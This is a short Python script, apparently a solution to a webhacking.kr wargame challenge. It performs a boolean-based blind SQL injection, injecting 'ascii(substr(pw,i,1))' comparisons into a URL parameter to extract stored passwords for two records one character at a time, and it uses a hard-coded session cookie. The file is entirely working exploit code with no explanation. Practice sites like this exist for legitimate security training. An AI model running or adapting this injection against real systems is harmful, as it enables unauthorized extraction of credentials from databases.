import requests

cookies={'PHPSESSID':"b3443541331e3ff78d360b76cd4b4fbd"}

url="http://webhacking.kr/challenge/bonus/bonus-1/index.php?"
password=""

#no=1
for i in range(1,6):
    for j in range (33,127):
        query="no=1 and ascii(substr(pw, "+str(i)+" ,1))="+str(j)
        pay_load=url+query
        print(pay_load)
        res=requests.get(pay_load, cookies=cookies)
        if((res.text).find("True")>0): 
            password+=chr(j);
            break

print (str(i)+"password : "+password)
password=""

#no=2
for i in range (1,20):
    for j in range (33,127):
        query="no=2 and ascii(substr(pw, "+str(i)+" ,1))="+str(j)
        pay_load=url+query
        print(pay_load)
        res=requests.get(pay_load,cookies=cookies)
        if((res.text).find("True")>0):
            password+=chr(j);
            break

print (str(i)+"password: "+password)
